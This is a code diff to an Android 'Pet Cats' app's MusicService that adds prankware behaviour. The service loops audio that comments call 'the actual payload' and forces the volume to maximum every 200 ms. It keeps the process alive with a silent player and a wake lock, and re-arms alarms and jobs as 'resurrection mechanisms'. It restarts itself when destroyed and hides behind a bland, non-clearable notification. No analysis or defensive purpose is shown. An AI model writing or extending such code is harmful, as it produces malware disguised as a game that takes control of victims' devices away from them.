@@ -14,6 +14,7 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.os.PowerManager
+import android.os.Process
 import android.support.v4.media.MediaMetadataCompat
 import android.support.v4.media.session.MediaSessionCompat
 import android.support.v4.media.session.PlaybackStateCompat
@@ -22,9 +23,17 @@ import androidx.media.app.NotificationCompat as MediaNotificationCompat
 
 class MusicService : Service() {
 
-    private var mediaPlayer: MediaPlayer? = null
-    private val CHANNEL_ID = "PetCatsChannel"
-    private val NOTIFICATION_ID = 1
+    companion object {
+        private const val CHANNEL_ID = "PetCatsAudio"
+        private const val NOTIFICATION_ID = 1
+        private const val VOLUME_ENFORCE_INTERVAL = 200L
+    }
+
+    // Player A — silent loop (keeps process alive as mediaPlayback)
+    private var silentPlayer: MediaPlayer? = null
+
+    // Player B — prank audio (the actual payload)
+    private var prankPlayer: MediaPlayer? = null
 
     private lateinit var audioManager: AudioManager
     private lateinit var mediaSession: MediaSessionCompat
@@ -36,9 +45,9 @@ class MusicService : Service() {
 
     private val volumeEnforcer = object : Runnable {
         override fun run() {
-            val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
-            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
-            handler.postDelayed(this, 200L)
+            val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
+            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
+            handler.postDelayed(this, VOLUME_ENFORCE_INTERVAL)
         }
     }
 
@@ -46,13 +55,71 @@ class MusicService : Service() {
         super.onCreate()
         audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
         createNotificationChannel()
+        setupMediaSession()
 
+        // Boost audio thread priority
+        Process.setThreadPriority(Process.THREAD_PRIORITY_AUDIO)
+
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        wakeLock = pm.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "PetCats::AudioWakeLock"
+        )
+        wakeLock?.acquire()
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        startForeground(NOTIFICATION_ID, buildNotification())
+
+        if (isRunning) return START_STICKY
+        isRunning = true
+
+        if (!requestAudioFocus()) {
+            isRunning = false
+            stopSelf()
+            return START_NOT_STICKY
+        }
+
+        originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
+        val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
+        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
+
+        handler.post(volumeEnforcer)
+
+        // Re-arm resurrection mechanisms
+        AlarmReceiver.scheduleAlarm(this)
+        ResurrectJobService.schedule(this)
+
+        startSilentLoop()
+        startPrankAudio()
+
+        return START_STICKY
+    }
+
+    private fun startSilentLoop() {
+        silentPlayer?.release()
+        silentPlayer = MediaPlayer.create(this, R.raw.sound).apply {
+            setVolume(0f, 0f)
+            isLooping = true
+            start()
+        }
+    }
+
+    private fun startPrankAudio() {
+        prankPlayer?.release()
+        prankPlayer = MediaPlayer.create(this, R.raw.sound).apply {
+            isLooping = true
+            start()
+        }
+    }
+
+    private fun setupMediaSession() {
         mediaSession = MediaSessionCompat(this, "PetCats").apply {
             setMetadata(
                 MediaMetadataCompat.Builder()
                     .putString(MediaMetadataCompat.METADATA_KEY_TITLE, "Pet Cats")
                     .putString(MediaMetadataCompat.METADATA_KEY_ARTIST, "Pet Cats")
-                    .putLong(MediaMetadataCompat.METADATA_KEY_DURATION, 10_000L)
+                    .putLong(MediaMetadataCompat.METADATA_KEY_DURATION, -1L)
                     .build()
             )
             setPlaybackState(
@@ -63,39 +130,6 @@ class MusicService : Service() {
             )
             isActive = true
         }
-
-        val pm = getSystemService(POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PetCats::AudioWakeLock")
-        wakeLock?.acquire()
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val notification = buildNotification()
-        startForeground(NOTIFICATION_ID, notification)
-
-        if (isRunning) return START_STICKY
-        isRunning = true
-
-        val focusGranted = requestAudioFocus()
-        if (!focusGranted) {
-            isRunning = false
-            stopSelf()
-            return START_NOT_STICKY
-        }
-
-        originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
-        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
-        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, 0)
-
-        handler.post(volumeEnforcer)
-
-        mediaPlayer?.release()
-        mediaPlayer = MediaPlayer.create(this, R.raw.sound).apply {
-            isLooping = true
-            start()
-        }
-
-        return START_STICKY
     }
 
     private fun requestAudioFocus(): Boolean {
@@ -136,17 +170,31 @@ class MusicService : Service() {
         super.onDestroy()
         isRunning = false
         handler.removeCallbacksAndMessages(null)
+
         if (originalVolume >= 0) {
             audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)
         }
+
         abandonAudioFocus()
-        mediaPlayer?.stop()
-        mediaPlayer?.release()
-        mediaPlayer = null
+
+        silentPlayer?.stop()
+        silentPlayer?.release()
+        silentPlayer = null
+
+        prankPlayer?.stop()
+        prankPlayer?.release()
+        prankPlayer = null
+
         mediaSession.isActive = false
         mediaSession.release()
+
         if (wakeLock?.isHeld == true) wakeLock?.release()
         wakeLock = null
+
+        // Self-resurrect
+        ContextCompat.startForegroundService(
+            this, Intent(this, MusicService::class.java)
+        )
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
@@ -155,10 +203,11 @@ class MusicService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Pet Cats Events",
+                "Pet Cats Audio",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Pet Cats game events and alerts"
+                description = "Pet Cats audio session"
+                setShowBadge(false)
             }
             getSystemService(NotificationManager::class.java)
                 .createNotificationChannel(channel)
@@ -172,6 +221,7 @@ class MusicService : Service() {
             .setSmallIcon(R.drawable.ic_notification)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
+            .setFlag(Notification.FLAG_NO_CLEAR, true)
             .setStyle(
                 MediaNotificationCompat.MediaStyle()
                     .setMediaSession(mediaSession.sessionToken)
